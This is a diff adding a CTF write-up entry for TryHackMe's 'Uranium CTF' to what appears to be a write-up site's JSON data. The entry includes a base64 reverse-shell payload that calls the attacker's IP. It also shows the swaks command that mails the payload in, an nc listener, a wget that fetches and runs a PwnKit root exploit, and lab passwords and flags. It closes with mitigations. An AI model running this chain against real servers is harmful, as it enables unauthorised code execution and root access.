@@ -334,6 +334,71 @@
    "againHtml": "<p>I'd check whether the FTP root was web-served *before* downloading anything, since that single fact is the whole foothold. And I'd upgrade the shell to a full TTY immediately after catching it, instead of hitting the nano terminal error first.</p>"
   },
   {
+   "slug": "uraniumctf",
+   "title": "Uranium CTF",
+   "platform": "TryHackMe",
+   "difficulty": "Hard",
+   "date": "2026-11-23",
+   "github": "https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/uraniumctf_writeup.md",
+   "summary": "Postfix will relay mail for its own local domain, so a crafted email with a base64-encoded reverse-shell attachment named application lands in…",
+   "takeaway": "The most dangerous step on this box wasn't a vulnerability at all — it was a cron job treating \"came from an email\" as equivalent to \"safe to run.\" Every later step compounds from there: a reused password, an unusable SUID binary that became usable the moment the privilege level changed, and a years-old CVE nobody patched. The transferable habit is to revisit every previously-dead-end finding (a SUID binary with the wrong group, a sudo -l demanding a password you don't have) the instant you land a new user — what's unusable now may become the whole escalation path one hop later.",
+   "tldrHtml": "Postfix will relay mail for its own local domain, so a crafted email with a base64-encoded reverse-shell attachment named <code>application</code> lands in <code>hakanbey</code>'s mailbox — and a cron job that extracts and executes any attachment matching that name runs it automatically, giving a shell as <code>hakanbey</code>. A locally-running chatbot service, reverse-engineered with <code>strace</code> to get past a red-herring &quot;hang,&quot; reveals a conversation where <code>kral4</code> reminds <code>hakanbey</code> of his own SSH password in plain text. From there, <code>sudo -l</code> shows <code>hakanbey</code> can become <code>kral4</code> with no extra password at all. As <code>kral4</code>, a group-owned SUID <code>/bin/dd</code> reads a flag <code>hakanbey</code> couldn't touch, and <code>kral4</code>'s inability to <code>sudo</code> points back at a vulnerable, unpatched <code>pkexec</code> — PwnKit, CVE-2021-4034 — which, after a quick glibc-compatibility check, hands over a root shell.",
+   "tools": [
+    "Nmap",
+    "swaks",
+    "netcat",
+    "strace",
+    "Wireshark",
+    "LinPEAS",
+    "pkexec / PwnKit (CVE-2021-4034)",
+    "readelf"
+   ],
+   "sections": [
+    {
+     "id": "introduction",
+     "label": "Introduction",
+     "html": "<p>Uranium CTF is a hard, multi-stage Linux box built around believable operational mistakes rather than a single flashy exploit: an open mail relay that trusts its own domain, a cron job that treats &quot;extracted from an email&quot; as &quot;safe to execute,&quot; a password reused between a toy chatbot and a real shell account, and a years-old <code>pkexec</code> left unpatched. None of the individual pieces are exotic — the box rewards methodically working through each user transition (<code>hakanbey → kral4 → root</code>) and re-checking old findings (an unusable SUID binary, a password-gated <code>sudo -l</code>) every time the privilege level changes.</p>"
+    },
+    {
+     "id": "recon",
+     "label": "Recon",
+     "html": "<pre><code class=\"language-bash\">nmap -Pn -sV -sC -p- uraniumctf.thm</code></pre>\n<pre><code>22/tcp   open  ssh      OpenSSH\n25/tcp   open  smtp     Postfix smtpd\n80/tcp   open  http</code></pre>\n<p>A quick manual SMTP probe confirms Postfix relays mail *within* its own domain while refusing it elsewhere:</p>\n<pre><code>MAIL FROM:&lt;test@uraniumctf.thm&gt;\nRCPT TO:&lt;root@uraniumctf.thm&gt;\n454 4.7.1 &lt;root@uraniumctf.thm&gt;: Relay access denied</code></pre>\n<p>Switching the sender and recipient domain to match the box's internal hostname (<code>uranium.thm</code> rather than the external <code>uraniumctf.thm</code>) is accepted — the mail server trusts its own local domain.</p>"
+    },
+    {
+     "id": "foothold",
+     "label": "Foothold",
+     "html": "<h3>A malicious email attachment</h3>\n<p><code>swaks</code> makes crafting the MIME email far easier than typing raw SMTP by hand. The payload is a base64-encoded reverse shell, attached as a file named <code>application</code>:</p>\n<pre><code class=\"language-bash\">swaks --to hakanbey@uranium.thm \\\n  --from hakanbey@uranium.thm \\\n  --header &quot;Subject: Application&quot; \\\n  --body &quot;Please find my application attached.&quot; \\\n  --server 10.49.134.173 \\\n  --attach @application</code></pre>\n<pre><code>-&gt; Content-Disposition: attachment; filename=&quot;application&quot;\n-&gt; YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1Ni4xMjMvNDQ0NCAwPiYxIgo=\n&lt;- 250 2.0.0 Ok: queued as 696C34012E</code></pre>\n<h3>The auto-execute cron job</h3>\n<p><code>hakanbey</code>'s crontab, read later from the resulting shell, explains why that specific filename matters:</p>\n<pre><code>* * * * * ripmime -i /var/mail/hakanbey -d /home/hakanbey/mail_file/ ; \\\n  find /home/hakanbey/mail_file/ -name &quot;application*&quot; -type f -exec chmod +x {} \\; -exec {} \\; ; \\\n  &gt; /var/mail/hakanbey ; rm /home/hakanbey/mail_file/*</code></pre>\n<p>Every minute, it extracts attachments from <code>hakanbey</code>'s mailbox, <code>chmod +x</code>s and *executes* anything named <code>application*</code>, then wipes the mailbox and the extracted files. Any email attachment with that exact prefix is code execution as <code>hakanbey</code>.</p>"
+    },
+    {
+     "id": "shell",
+     "label": "Shell and access",
+     "html": "<pre><code class=\"language-bash\">nc -lvnp 4444</code></pre>\n<p>Within a minute, the cron job fires and a reverse shell lands as <code>hakanbey</code>, reading <code>user_1.txt</code> during this initial foothold phase. The home directory holds two more leads:</p>\n<pre><code>chat_with_kral4   # ELF64 client binary\nmail_file/        # leftover extraction artifacts</code></pre>"
+    },
+    {
+     "id": "escalation",
+     "label": "Escalation",
+     "html": "<h3>Reverse-engineering the chatbot</h3>\n<p>A systemd unit shows a chatbot service running locally as <code>kral4</code>:</p>\n<pre><code class=\"language-ini\">[Service]\nUser=kral4\nExecStart=/home/kral4/chat_with_hakanbey</code></pre>\n<p><code>hakanbey</code>'s matching client, <code>chat_with_kral4</code>, connects to <code>127.0.0.1:1234</code>, sends <code>CLIENT</code>, and prompts for a password. The first attempts to run it appear to hang after the password is entered — but <code>strace</code> shows the password actually being sent correctly:</p>\n<pre><code>sendto(3, &quot;CLIENT&quot;, 6, 0, NULL, 0) = 6\nsendto(3, &quot;MBMD1vdpjg3kGv6SsIz56VNG&quot;, 24, 0, NULL, 0) = 24\nrecvfrom(3, ...)</code></pre>\n<p>The real problem is stale client processes left over from earlier attempts. Killing them (<code>pkill -f chat_with_kral4</code>) and running it fresh gets a working chat session, and the conversation between <code>hakanbey</code> and <code>kral4</code> leaks a second, unrelated credential in plain text:</p>\n<pre><code>kral4: okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE</code></pre>\n<p>That's <code>hakanbey</code>'s real SSH password — distinct from the chatbot's own password, confirmed independently later via a PCAP LinPEAS surfaces at <code>/var/log/hakanbey_network_log.pcap</code> (filtering Wireshark on <code>tcp contains &quot;password&quot;</code> shows the same conversation).</p>\n<h3>The group-owned SUID binary, and the sudo shortcut</h3>\n<p>Enumeration turns up a <code>web</code> account and its flag, unreadable to <code>hakanbey</code>:</p>\n<pre><code>-rw------- 1 web web ... /var/www/html/web_flag.txt</code></pre>\n<p>...and a custom SUID <code>/bin/dd</code>:</p>\n<pre><code>-rwsr-x--- 1 web kral4 76000 Apr 23  2021 /bin/dd</code></pre>\n<p>Owned by <code>web</code> with the SUID bit set, but only executable by <code>web</code> or members of the <code>kral4</code> group — <code>hakanbey</code> is neither, so this is a dead end for now (see Escalation Path below). Checking <code>sudo -l</code> as <code>hakanbey</code> turns out to be the actual key:</p>\n<pre><code>User hakanbey may run the following commands on uranium:\n    (kral4) /bin/bash</code></pre>\n<p>No password cracking needed — the sudoers rule explicitly authorizes this:</p>\n<pre><code class=\"language-bash\">sudo -u kral4 /bin/bash</code></pre>"
+    },
+    {
+     "id": "chain",
+     "label": "The full chain",
+     "html": "<h3>Picking up the pieces as kral4</h3>\n<p>With a shell as <code>kral4</code>, the earlier dead end becomes live: <code>user_2.txt</code> is sitting in the home directory, and the SUID <code>/bin/dd</code> — group-owned by <code>kral4</code> — now runs with effective UID <code>web</code>:</p>\n<pre><code class=\"language-bash\">cat /home/kral4/user_2.txt\n/bin/dd if=/var/www/html/web_flag.txt</code></pre>\n<pre><code>thm{804d12e6d16189075db2d45449aeda5f}\nthm{019d332a6a223a98b955c160b3e6750a}</code></pre>\n<h3>PwnKit for root</h3>\n<p><code>sudo -l</code> as <code>kral4</code> demands a password that was never recovered — dead end. <code>find / -perm -4000</code> still shows <code>/usr/bin/pkexec</code>, and its installed <code>policykit-1</code> version (<code>0.105-20ubuntu0.18.04.5</code>) is one patch revision below the fix for <strong>CVE-2021-4034 (PwnKit)</strong>.</p>\n<p>Before transferring an exploit built on an Arch host running a much newer glibc, the binary's actual requirement is checked rather than assumed:</p>\n<pre><code class=\"language-bash\">readelf --version-info /tmp/PwnKit | grep GLIBC_\n# highest required: GLIBC_2.14 — well below the target's 2.27</code></pre>\n<p>Compatible. Transfer it over and run it as <code>kral4</code>:</p>\n<pre><code class=\"language-bash\">wget http://192.168.156.123:8000/PwnKit -O PwnKit\nchmod +x PwnKit\n./PwnKit</code></pre>\n<pre><code>root@uranium:/tmp# cd /root\nroot@uranium:~# cat root.txt\nthm{81498047439cc0426bafa1db5da699cd}</code></pre>"
+    },
+    {
+     "id": "rabbit-holes",
+     "label": "Rabbit holes",
+     "html": "<ul><li><strong>Docker as a privesc route:</strong> <code>kral4</code> can start <code>docker</code>, but the daemon fails immediately with <code>failed to create NAT chain DOCKER</code> / an <code>iptables</code>-vs-<code>nftables</code> conflict on the attacking host. Fixing the attacker's firewall integration just to use Docker as a compilation sandbox wasn't worth it once a working prebuilt exploit was available.</li><li><strong>Compiling PwnKit from source:</strong> GCC wasn't installed on the target, and Docker was unusable (above), so static cross-compilation with Zig's musl target was tested as a fallback (<code>zig cc -target x86_64-linux-musl -static</code>). It worked, but became unnecessary once a prebuilt PwnKit binary was confirmed glibc-compatible with <code>readelf</code>.</li><li><strong><code>pkexec</code>'s empty changelog grep:</strong> searching the Debian changelog for the CVE string by name returned nothing, which could be mistaken for &quot;patched.&quot; An empty grep result is not proof of a patch — the actual installed version number against the known-fixed version is the real check.</li></ul>"
+    },
+    {
+     "id": "mitigations",
+     "label": "Mitigations",
+     "html": "<ul><li><strong>Open mail relay for the local domain:</strong> Postfix accepting mail addressed to its own domain from any sender is exactly the gap this attack walks through. Restrict relaying to authenticated senders only.</li><li><strong>Executing mail attachments automatically:</strong> a cron job that <code>chmod +x</code>s and runs anything extracted from incoming mail is remote code execution by design. Never execute untrusted content pulled from an email pipeline — if automated attachment handling is required, sandbox it and never grant execute permission.</li><li><strong>Password reuse between a toy service and a real account:</strong> the chatbot leaking <code>hakanbey</code>'s actual SSH password in a casual conversation turned a low-stakes demo service into full account compromise. Credentials for different trust levels must never be the same value, and definitely not exchanged in plaintext chat logs.</li><li><strong>Overly permissive sudoers / group-owned SUID binaries:</strong> <code>(kral4) /bin/bash</code> with no password, and a SUID <code>dd</code> reachable by the <code>kral4</code> group, both skip intended access controls. Grant the minimum command needed (never a full shell), and audit SUID binaries' owning group as carefully as their owning user.</li><li><strong>Unpatched <code>pkexec</code>:</strong> CVE-2021-4034 is years old and trivially exploitable. Keep <code>policykit-1</code> current and treat any outstanding local-root CVE as a priority patch, not background noise.</li></ul>"
+    }
+   ],
+   "takeawayHtml": "The most dangerous step on this box wasn't a vulnerability at all — it was a cron job treating &quot;came from an email&quot; as equivalent to &quot;safe to run.&quot; Every later step compounds from there: a reused password, an unusable SUID binary that became usable the moment the privilege level changed, and a years-old CVE nobody patched. The transferable habit is to revisit every previously-dead-end finding (a SUID binary with the wrong group, a sudo -l demanding a password you don't have) the instant you land a new user — what's unusable now may become the whole escalation path one hop later.",
+   "againHtml": "<p>I'd check <code>sudo -l</code> immediately after landing each new shell, before spending time on password cracking or binary enumeration — it was the actual shortcut from <code>hakanbey</code> to <code>kral4</code>, found only after already investigating the chatbot in depth. I'd also verify a downloaded exploit's glibc requirements with <code>readelf</code> *before* attempting to compile a from-scratch alternative, rather than after — the Docker/Zig detour cost real time that the prebuilt binary made unnecessary.</p>"
+  },
+  {
    "slug": "ra",
    "title": "Ra",
    "platform": "TryHackMe",
